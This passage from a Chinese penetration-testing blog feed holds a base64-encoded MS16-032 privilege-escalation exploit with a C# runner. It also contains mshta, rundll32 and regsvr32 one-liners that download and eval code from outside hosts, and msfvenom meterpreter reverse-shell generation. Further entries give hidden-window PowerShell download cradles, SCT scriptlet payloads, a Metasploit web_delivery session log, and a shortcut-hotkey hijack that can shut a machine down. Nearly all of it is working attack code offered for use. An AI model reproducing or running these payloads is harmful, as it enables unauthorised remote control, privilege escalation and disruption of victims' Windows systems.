AogICAgICAgICMgTE9HT05fTkVUQ1JFREVOVElBTFNfT05MWSAvIENSRUFURV9TVVNQRU5ERUQKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OkNyZWF0ZVByb2Nlc3NXaXRoTG9nb25XKAogICAgICAgICAgICAidXNlciIsICJkb21haW4iLCAicGFzcyIsCiAgICAgICAgICAgIDB4MDAwMDAwMDIsICJDOlxXaW5kb3dzXFN5c3RlbTMyXG5vdGVwYWQuZXhlIiwgIiIsCiAgICAgICAgICAgIDB4MDAwMDAwMDQsICRudWxsLCAkR2V0Q3VycmVudFBhdGgsCiAgICAgICAgICAgIFtyZWZdJFN0YXJ0dXBJbmZvLCBbcmVmXSRQcm9jZXNzSW5mbykKICAgICAgICAKICAgICAgICAjIER1cGxpY2F0ZSBoYW5kbGUgaW50byBjdXJyZW50IHByb2Nlc3MgLT4gRFVQTElDQVRFX1NBTUVfQUNDRVNTCiAgICAgICAgJGxwVGFyZ2V0SGFuZGxlID0gW0ludFB0cl06Olplcm8KICAgICAgICAkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OkR1cGxpY2F0ZUhhbmRsZSgKICAgICAgICAgICAgJFByb2Nlc3NJbmZvLmhQcm9jZXNzLCAweDQsCiAgICAgICAgICAgIFtLZXJuZWwzMl06OkdldEN1cnJlbnRQcm9jZXNzKCksCiAgICAgICAgICAgIFtyZWZdJGxwVGFyZ2V0SGFuZGxlLCAwLCAkZmFsc2UsCiAgICAgICAgICAgIDB4MDAwMDAwMDIpCiAgICAgICAgCiAgICAgICAgIyBDbGVhbiB1cCBzdXNwZW5kZWQgcHJvY2VzcwogICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6VGVybWluYXRlUHJvY2VzcygkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDEpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFByb2Nlc3MpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFRocmVhZCkKICAgICAgICAKICAgICAgICAkbHBUYXJnZXRIYW5kbGUKICAgIH0KICAgIAogICAgZnVuY3Rpb24gR2V0LVN5c3RlbVRva2VuIHsKICAgICAgICBlY2hvICJgbls/XSBUcnlpbmcgdGhyZWFkIGhhbmRsZTogJFRocmVhZCIKICAgICAgICBlY2hvICJbP10gVGhyZWFkIGJlbG9uZ3MgdG86ICQoJChHZXQtUHJvY2VzcyAtUElEICQoW0tlcm5lbDMyXTo6R2V0UHJvY2Vzc0lkT2ZUaHJlYWQoJFRocmVhZCkpKS5Qcm9jZXNzTmFtZSkiCiAgICAKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OlN1c3BlbmRUaHJlYWQoJFRocmVhZCkKICAgICAgICBpZiAoJENhbGxSZXN1bHQgLW5lIDApIHsKICAgICAgICAgICAgZWNobyAiWyFdICRUaHJlYWQgaXMgYSBiYWQgdGhyZWFkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfSBlY2hvICJbK10gVGhyZWFkIHN1c3BlbmRlZCIKICAgICAgICAKICAgICAgICBlY2hvICJbPl0gV2lwaW5nIGN1cnJlbnQgaW1wZXJzb25hdGlvbiB0b2tlbiIKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OlNldFRocmVhZFRva2VuKFtyZWZdJFRocmVhZCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgaWYgKCEkQ2FsbFJlc3VsdCkgewogICAgICAgICAgICBlY2hvICJbIV0gU2V0VGhyZWFkVG9rZW4gZmFpbGVkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgICAgICAgICAgZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVjaG8gIls+XSBCdWlsZGluZyBTWVNURU0gaW1wZXJzb25hdGlvbiB0b2tlbiIKICAgICAgICAjIFNlY3VyaXR5UXVhbGl0eU9mU2VydmljZSBzdHJ1Y3QKICAgICAgICAkU1FPUyA9IE5ldy1PYmplY3QgU1FPUwogICAgICAgICRTUU9TLkltcGVyc29uYXRpb25MZXZlbCA9IDIgI1NlY3VyaXR5SW1wZXJzb25hdGlvbgogICAgICAgICRTUU9TLkxlbmd0aCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU1FPUykKICAgICAgICAjIFVuZG9jdW1lbnRlZCBBUEkncywgSSBsaWtlIHlvdXIgc3R5bGUgTWljcm9zb2Z0IDspCiAgICAgICAgJENhbGxSZXN1bHQgPSBbTnRkbGxdOjpOdEltcGVyc29uYXRlVGhyZWFkKCRUaHJlYWQsICRUaHJlYWQsIFtyZWZdJHNxb3MpCiAgICAgICAgaWYgKCRDYWxsUmVzdWx0IC1uZSAwKSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBOdEltcGVyc29uYXRlVGhyZWFkIGZhaWxlZCwgbW92aW5nIG9uLi4iCiAgICAgICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRUaHJlYWQpCiAgICAgICAgICAgIGVjaG8gIlsrXSBUaHJlYWQgcmVzdW1lZCEiCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgIAogICAgICAgICRzY3JpcHQ6U3lzVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICMgMHgwMDA2IC0tPiBUT0tFTl9EVVBMSUNBVEUgLWJvciBUT0tFTl9JTVBFUlNPTkFURQogICAgICAgICRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblRocmVhZFRva2VuKCRUaHJlYWQsIDB4MDAwNiwgJGZhbHNlLCBbcmVmXSRTeXNUb2tlbkhhbmRsZSkKICAgICAgICBpZiAoISRDYWxsUmVzdWx0KSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBPcGVuVGhyZWFkVG9rZW4gZmFpbGVkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgICAgICAgICAgZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVjaG8gIls/XSBTdWNjZXNzLCBvcGVuIFNZU1RFTSB0b2tlbiBoYW5kbGU6ICRTeXNUb2tlbkhhbmRsZSIKICAgICAgICBlY2hvICJbK10gUmVzdW1pbmcgdGhyZWFkLi4iCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgIH0KICAgIAogICAgIyBtYWluKCkgPC0tLSA7KQogICAgJG1zMTYwMzIgPSBAIgogICAgIF9fIF9fIF9fXyBfX18gICBfX18gICAgIF9fXyBfX18gX19fIAogICAgfCAgViAgfCAgX3xfICB8IHwgIF98X19ffCAgIHxfICB8XyAgfAogICAgfCAgICAgfF8gIHxffCB8X3wgLiB8X19ffCB8IHxfICB8ICBffAogICAgfF98X3xffF9fX3xfX19fX3xfX198ICAgfF9fX3xfX198X19ffAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICBbYnkgYjMzZiAtPiBARnV6enlTZWNdCiJACiAgICAKICAgICRtczE2MDMyCiAgICAKICAgICMgQ2hlY2sgbG9naWNhbCBwcm9jZXNzb3IgY291bnQsIHJhY2UgY29uZGl0aW9uIHJlcXVpcmVzIDIrCiAgICBlY2hvICJgbls/XSBPcGVyYXRpbmcgc3lzdGVtIGNvcmUgY291bnQ6ICQoW1N5c3RlbS5FbnZpcm9ubWVudF06OlByb2Nlc3NvckNvdW50KSIKICAgIGlmICgkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpQcm9jZXNzb3JDb3VudCkgLWx0IDIpIHsKICAgICAgICBlY2hvICJbIV0gVGhpcyBpcyBhIFZNIGlzbid0IGl0LCByYWNlIGNvbmRpdGlvbiByZXF1aXJlcyBhdCBsZWFzdCAyIENQVSBjb3JlcywgZXhpdGluZyFgbiIKICAgICAgICBSZXR1cm4KICAgIH0KICAgIAogICAgIyBDcmVhdGUgYXJyYXkgZm9yIFRocmVhZHMgJiBUSUQncwogICAgJFRocmVhZEFycmF5ID0gQCgpCiAgICAkVGlkQXJyYXkgPSBAKCkKICAgIAogICAgZWNobyAiWz5dIER1cGxpY2F0aW5nIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIGhhbmRsZXMuLiIKICAgICMgTG9vcCBHZXQtVGhyZWFkSGFuZGxlIGFuZCBjb2xsZWN0IHRocmVhZCBoYW5kbGVzIHdpdGggYSB2YWxpZCBUSUQKICAgIGZvciAoJGk9MDsgJGkgLWx0IDUwMDsgJGkrKykgewogICAgICAgICRoVGhyZWFkID0gR2V0LVRocmVhZEhhbmRsZQogICAgICAgICRoVGhyZWFkSUQgPSBbS2VybmVsMzJdOjpHZXRUaHJlYWRJZCgkaFRocmVhZCkKICAgICAgICAjIEJpdCBoYWNreS9sYXp5LCBmaWx0ZXJzIG9uIHVuaXEvdmFsaWQgVElEJ3MgdG8gY3JlYXRlICRUaHJlYWRBcnJheQogICAgICAgIGlmICgkVGlkQXJyYXkgLW5vdGNvbnRhaW5zICRoVGhyZWFkSUQpIHsKICAgICAgICAgICAgJFRpZEFycmF5ICs9ICRoVGhyZWFkSUQKICAgICAgICAgICAgaWYgKCRoVGhyZWFkIC1uZSAwKSB7CiAgICAgICAgICAgICAgICAkVGhyZWFkQXJyYXkgKz0gJGhUaHJlYWQgIyBUaGlzIGlzIHdoYXQgd2UgbmVlZCEKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIAogICAgaWYgKCQoJFRocmVhZEFycmF5Lmxlbmd0aCkgLWVxIDApIHsKICAgICAgICBlY2hvICJbIV0gTm8gdmFsaWQgdGhyZWFkIGhhbmRsZXMgd2VyZSBjYXB0dXJlZCwgZXhpdGluZyEiCiAgICAgICAgUmV0dXJuCiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIls/XSBEb25lLCBnb3QgJCgkVGhyZWFkQXJyYXkubGVuZ3RoKSB0aHJlYWQgaGFuZGxlKHMpISIKICAgICAgICBlY2hvICJgbls/XSBUaHJlYWQgaGFuZGxlIGxpc3Q6IgogICAgICAgICRUaHJlYWRBcnJheQogICAgfQogICAgCiAgICBlY2hvICJgblsqXSBTbmlmZmluZyBvdXQgcHJpdmlsZWdlZCBpbXBlcnNvbmF0aW9uIHRva2VuLi4iCiAgICBmb3JlYWNoICgkVGhyZWFkIGluICRUaHJlYWRBcnJheSl7CiAgICAKICAgICAgICAjIEdldCBoYW5kbGUgdG8gU1lTVEVNIGFjY2VzcyB0b2tlbgogICAgICAgIEdldC1TeXN0ZW1Ub2tlbgogICAgICAgIAogICAgICAgIGVjaG8gImBuWypdIFNuaWZmaW5nIG91dCBTWVNURU0gc2hlbGwuLiIKICAgICAgICBlY2hvICJgbls+XSBEdXBsaWNhdGluZyBTWVNURU0gdG9rZW4iCiAgICAgICAgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpEdXBsaWNhdGVUb2tlbigkU3lzVG9rZW5IYW5kbGUsIDIsIFtyZWZdJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAKICAgICAgICAjIFNpbXBsZSBQUyBydW5zcGFjZSBkZWZpbml0aW9uCiAgICAgICAgZWNobyAiWz5dIFN0YXJ0aW5nIHRva2VuIHJhY2UiCiAgICAgICAgJFJ1bnNwYWNlID0gW3J1bnNwYWNlZmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICAgICAkU3RhcnRUb2tlblJhY2UgPSBbcG93ZXJzaGVsbF06OkNyZWF0ZSgpCiAgICAgICAgJFN0YXJ0VG9rZW5SYWNlLnJ1bnNwYWNlID0gJFJ1bnNwYWNlCiAgICAgICAgJFJ1bnNwYWNlLk9wZW4oKQogICAgICAgIFt2b2lkXSRTdGFydFRva2VuUmFjZS5BZGRTY3JpcHQoewogICAgICAgICAgICBQYXJhbSAoJFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAgICAgd2hpbGUgKCR0cnVlKSB7CiAgICAgICAgICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OlNldFRocmVhZFRva2VuKFtyZWZdJFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAgICAgfQogICAgICAgIH0pLkFkZEFyZ3VtZW50KCRUaHJlYWQpLkFkZEFyZ3VtZW50KCRoRHVwbGljYXRlVG9rZW5IYW5kbGUpCiAgICAgICAgJEFzY09iaiA9ICRTdGFydFRva2VuUmFjZS5CZWdpbkludm9rZSgpCiAgICAgICAgCiAgICAgICAgZWNobyAiWz5dIFN0YXJ0aW5nIHByb2Nlc3MgcmFjZSIKICAgICAgICAjIEFkZGluZyBhIHRpbWVvdXQgKDEwIHNlY29uZHMpIGhlcmUgdG8gc2FmZWd1YXJkIGZyb20gZWRnZS1jYXNlcwogICAgICAgICRTYWZlR3VhcmQgPSBbZGlhZ25vc3RpY3Muc3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgIHdoaWxlICgkU2FmZUd1YXJkLkVsYXBzZWRNaWxsaXNlY29uZHMgLWx0IDEwMDAwKSB7CiAgICAgICAgIyBTdGFydHVwSW5mbyBTdHJ1Y3QKICAgICAgICAkU3RhcnR1cEluZm8gPSBOZXctT2JqZWN0IFNUQVJUVVBJTkZPCiAgICAgICAgJFN0YXJ0dXBJbmZvLmNiID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKCRTdGFydHVwSW5mbykgIyBTdHJ1Y3QgU2l6ZQogICAgICAgICRTdGFydHVwSW5mby5kd0ZsYWdzID0gMHgwMDAwMDEwMSAjIFNUQVJURl9VU0VTVERIQU5ETEVTCiAgICAgICAgICAgICRTdGFydHVwSW5mby53U2hvd1dpbmRvdyA9IDA7CiAgICAgICAgIyBQcm9jZXNzSW5mbyBTdHJ1Y3QKICAgICAgICAkUHJvY2Vzc0luZm8gPSBOZXctT2JqZWN0IFBST0NFU1NfSU5GT1JNQVRJT04KICAgICAgICAKICAgICAgICAjIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIC0tPiBscEN1cnJlbnREaXJlY3RvcnkKICAgICAgICAkR2V0Q3VycmVudFBhdGggPSAoR2V0LUl0ZW0gLVBhdGggIi5cIiAtVmVyYm9zZSkuRnVsbE5hbWUKICAgICAgICAKICAgICAgICAjIExPR09OX05FVENSRURFTlRJQUxTX09OTFkgLyBDUkVBVEVfU1VTUEVOREVECiAgICAgICAgJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpDcmVhdGVQcm9jZXNzV2l0aExvZ29uVygKICAgICAgICAgICAgInVzZXIiLCAiZG9tYWluIiwgInBhc3MiLAogICAgICAgICAgICAweDAwMDAwMDAyLCAkQXBwbGljYXRpb24sJENvbW1hbmRsaW5lLAogICAgICAgICAgICAweDAwMDAwMDA0LCAkbnVsbCwgJEdldEN1cnJlbnRQYXRoLAogICAgICAgICAgICBbcmVmXSRTdGFydHVwSW5mbywgW3JlZl0kUHJvY2Vzc0luZm8pCiAgICAgICAgICAgIAogICAgICAgICRoVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblByb2Nlc3NUb2tlbigkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDB4MjgsIFtyZWZdJGhUb2tlbkhhbmRsZSkKICAgICAgICAjIElmIHdlIGNhbid0IG9wZW4gdGhlIHByb2Nlc3MgdG9rZW4gaXQncyBhIFNZU1RFTSBzaGVsbCEKICAgICAgICBpZiAoISRDYWxsUmVzdWx0KSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBIb2x5IGhhbmRsZSBsZWFrIEJhdG1hbiwgd2UgaGF2ZSBhIFNZU1RFTSBzaGVsbCEhYG4iCiAgICAgICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRQcm9jZXNzSW5mby5oVGhyZWFkKQogICAgICAgICAgICAkU3RhcnRUb2tlblJhY2UuU3RvcCgpCiAgICAgICAgICAgICRTYWZlR3VhcmQuU3RvcCgpCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgIyBDbGVhbiB1cCBzdXNwZW5kZWQgcHJvY2VzcwogICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6VGVybWluYXRlUHJvY2VzcygkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDEpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFByb2Nlc3MpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFRocmVhZCkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgIyBLaWxsIHJ1bnNwYWNlICYgc3RvcHdhdGNoIGlmIGVkZ2UtY2FzZQogICAgICAgICRTdGFydFRva2VuUmFjZS5TdG9wKCkKICAgICAgICAkU2FmZUd1YXJkLlN0b3AoKQogICAgfQp9")); public void ExecuteSynchronously(string aplication,string commandline) &#123; string Commandout; InitialSessionState iss = InitialSessionState.CreateDefault(); Runspace rs = RunspaceFactory.CreateRunspace(iss); rs.Open(); PowerShell ps = PowerShell.Create(); ps.Runspace = rs; ps.AddScript(PSInvoke_MS16_032); if (commandline != "") &#123; Commandout = "Invoke-MS16-032 -Application \"" + aplication + "\" -Commandline " + "\""+commandline+"\""; &#125; else&#123; Commandout = "Invoke-MS16-032 -Application " + aplication; &#125; Console.WriteLine(Commandout); ps.AddScript(Commandout); ps.AddCommand("Out-Default"); ps.Invoke(); rs.Close(); &#125; &#125;&#125; base64的内容是 https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1 的所有内容的base64编码（你可以使用你自己的powershell脚本），由于我改的这个是有参数的，所以简单的写了上面的c#代码，通过.net来执行powershell。 编译需要System.Management.Automation.dll，具体步骤在cs文件里面已经写了，你们自己编译吧，只是对本机进行了测试，没测试别的，测试Demo如下： http://static.wooyun.org/upload/image/201606/2016063013052815262.gif 通过.net来执行powershell，并不需要powershell.exe 。详情可以看一下 p0wnedShell 或者 http://zone.wooyun.org/content/26831 .net 2.0下编译的版本在这里]]></content>
      <categories>
        <category>渗透案例</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Exec Commands Via Mshta.exe]]></title>
    <url>%2Farchives%2FExec_Commands_Via_Mshta.html</url>
    <content type="text"><![CDATA[看用“世界上最好的编程语言”制作的敲诈者木马揭秘的时候发现，攻击者使用mshta来执行命令，之前没怎么接触过，查了查资料也不是很多，mshta是用来执行hta文件的，经过测试发现，其实没有hta文件，也可以通过mshta来执行命令的，经过几次测试发现mshta不仅可以使用vbscript，而且可以使用javascript来执行命令，整理payload如下： VBSCRIPT EXEC1mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close) JAVASCRIPT EXEC1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125; JSRAT1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125; Demo如下： 你猜猜还可以怎么玩儿？ 2333333.]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hijacking Common Windows Shortcuts with Powershell]]></title>
    <url>%2Farchives%2Fhijacking-common-windows-shortcuts-with-powershell.html</url>
    <content type="text"><![CDATA[Demo: 劫持快捷键，执行命令。 Code: calc: $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;desktop\desktoppayload.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot; $Shortcut.hotkey = &quot;ctrl+c&quot; $Shortcut.Arguments = &apos;calc&apos; $Shortcut.Save() shutdown: $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;desktop\desktoppayload.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot; $Shortcut.hotkey = &quot;ctrl+c&quot; $Shortcut.Arguments = &apos;shutdown /s /t 0&apos; $Shortcut.Save() 更多玩儿法，你来创造~]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Javascript及COM脚本的进一步利用]]></title>
    <url>%2Farchives%2FJavascript_And_ComScript.html</url>
    <content type="text"><![CDATA[0x00 优化JSRAT进一步优化的jsrat启动代码：1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try&#123;v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");try&#123;q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);&#125;catch(e)&#123;h.SetProxy(2,v);&#125;&#125;finally&#123;h.Open("GET","http://54.93.72.226:8080/connect",false);h.Send();B=h.ResponseText;eval(B)&#125; 当客户端存在代理的时候，通过代理来进行链接。 多了注册表关键字，容易被杀，可以使用WSC方式来启动，将代码写到远程文件，执行如下命令：1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://url/script") 0x01 如何优雅的生成Rundll32代码nishang作者写了一个脚本Out-RundllCommand，可以很方便的生成代码。 如果想弹一个powershell的shell，可以这样来生成：1Out-RundllCommand -Reverse -IPAddress 192.168.230.1 -Port 443 或者直接这样：1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Execution/Out-RundllCommand.ps1'); Out-RundllCommand -Reverse -IPAddress 192.168.230.1 -Port 443" 如果要执行远程powershell脚本，可以这样：1Out-RundllCommand -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53" 0x02 获取meterpreter生成ps1脚本：1msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.2.100 lport=8888 -f psh-reflection -o payload.ps1 将脚本放到服务器上，可以使用如下方式获取会话1、生成命令：1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();r=new%20ActiveXObject("WScript.Shell").run("powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('http://192.168.2.100/payload.ps1'));",0,true); 2、生成SCT文件： SCT内容如下：123456789101112131415161718&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="PoC" classid="&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt; &lt;!-- License: BSD3-Clause --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ ps = 'powershell.exe -w h -nologo -noprofile -ep bypass '; c = "IEX ((New-Object Net.WebClient).DownloadString('http://192.168.2.100/payload.ps1'));"; r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 将UpdateCheck.xml放到服务器上，执行以下命令即可：1regsvr32.exe /u /n /s /i:http://192.168.2.100/UpdateCheck.xml scrobj.dll 3、生成js文件： js文件内容如下：123ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';c = "IEX ((New-Object Net.WebClient).DownloadString('http://192.168.2.100/payload.ps1'));";r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true); 双击则上线。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DMZ下使用web_delivery 介绍]]></title>
    <url>%2Farchives%2FUse_Web_delivery_Under_DMZ.html</url>
    <content type="text"><![CDATA[之前碰到的问题，自己的主机做了DMZ，设置[b]web_delivery[/b]时，发现将lhost设置成外网ip，则脚本不能运行，如果设置成内网ip，则反弹payload反弹的地址为内网地址，即不可能获取到会话，查看详细配置信息，发现存在reverselistenerbindaddress 设置选项，解决了此问题，当然，此参数也适用于用vps转发端口使用本地msf的情况。详细配置如下： 使用vps转发 8081 端口到本地8081端口 (web_delivery服务端口)1ssh -N -R 8081:ip:8081 user@ip 使用vps转发 6666 端口到本地6666端口 （web_delivery payload 监听端口）1ssh -N -R 6666:ip:6666 user@ip msf开启并配置web_delivery123456789101112131415161718192021222324msf &gt; use exploit/multi/script/web_deliverymsf exploit(web_delivery) &gt; set target 2target =&gt; 2msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(web_delivery) &gt; set SRVPORT 8081SRVPORT =&gt; 8081msf exploit(web_delivery) &gt; set URIPATH /URIPATH =&gt; /msf exploit(web_delivery) &gt; set lhost ip #外网ip地址lhost =&gt; ipmsf exploit(web_delivery) &gt; set lport 6666lport =&gt; 6666msf exploit(web_delivery) &gt; set reverselistenerbindaddress 192.168.2.100 #内网ip地址reverselistenerbindaddress =&gt; 192.168.2.100msf exploit(web_delivery) &gt; exploit[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.2.100:6666msf exploit(web_delivery) &gt; [*] Using URL: http://0.0.0.0:8081/[*] Local IP: http://192.168.2.100:8081/[*] Server started.[*] Run the following command on the target machine:powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://外网ip:8081/'); 客户端执行：powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring(&#39;http://外网ip:8081/&#39;); 内网msf获取meterpreter会话。 DMZ情形下，不需要做端口转发，只需要把lhost设置为外网ip地址，reverselistenerbindaddress 设置为内网ip地址即可。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSRAT几种启动方式]]></title>
    <url>%2Farchives%2FRun_JSRAT.html</url>
    <content type="text"><![CDATA[1.默认方式1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125;% 2.Use SCT运行计算器：1regsvr32 /u /s /i:http://urlto/calc.sct scrobj.dll calc.sct:12345678910111213141516171819202122232425262728293031323334353637&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration description="Empire" progid="Empire" version="1.00" classid="&#123;20001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- regsvr32 /s /i"C:\Bypass\Backdoor.sct" scrobj.dll --&gt; &lt;!-- regsvr32 /s /i:http://server/Backdoor.sct scrobj.dll --&gt; &lt;!-- That should work over a proxy and SSL/TLS... --&gt; &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;public&gt; &lt;method name="Exec"&gt;&lt;/method&gt;&lt;/public&gt;&lt;script language="JScript"&gt;&lt;![CDATA[ function Exec() &#123; var r = new ActiveXObject("WScript.Shell").Run("cmd.exe"); &#125; ]]&gt;&lt;/script&gt;&lt;/scriptlet&gt; 运行JSRAT:1regsvr32 /s /n /u /i:http://urlto/JSRAT.sct scrobj.dll JSRAT.sct12345678910111213141516&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="ShortJSRAT" 